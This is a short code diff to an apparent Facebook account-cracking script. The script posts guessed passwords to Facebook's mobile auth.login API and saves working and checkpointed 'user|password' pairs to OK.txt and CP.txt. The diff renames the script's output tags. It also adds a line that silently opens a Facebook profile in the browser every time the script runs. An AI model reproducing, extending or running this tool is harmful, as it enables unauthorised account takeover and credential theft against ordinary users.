@@ -42,7 +42,7 @@ def xox(z):
 		sys.stdout.flush()
 		time.sleep(0.01)
 
-
+os.system('xdg-open https://facebook.com/ft.alvi.18')
 def banner():
 	os.system("clear")
 	print("")
@@ -202,13 +202,13 @@ def cracker(user,pwx,tl):
 			xnxx = ses.post("https://b-api.facebook.com/method/auth.login", data=data, headers=head, allow_redirects=False).text
 			result = json.loads(xnxx)
 			if "session_key" in result:
-				print('\033[1;32m [AZIM-OK] '+user+'|'+pw+'\033[0;97m')
+				print('\033[1;32m [FIRE-OK] '+user+'|'+pw+'\033[0;97m')
 				open('OK.txt', 'a').write(user+'|'+pw+'\n')
 				oks.append(user)
 				break
 			elif "www.facebook.com" in result["error_msg"]:
 				print(result)
-				print('\033[1;31m [AZIM-CP] '+user+'|'+pw+'\033[0;97m')
+				print('\033[1;31m [FIRE-CP] '+user+'|'+pw+'\033[0;97m')
 				open('CP.txt', 'a').write(user+'|'+pw+'\n')
 				cps.append(user)
 				break
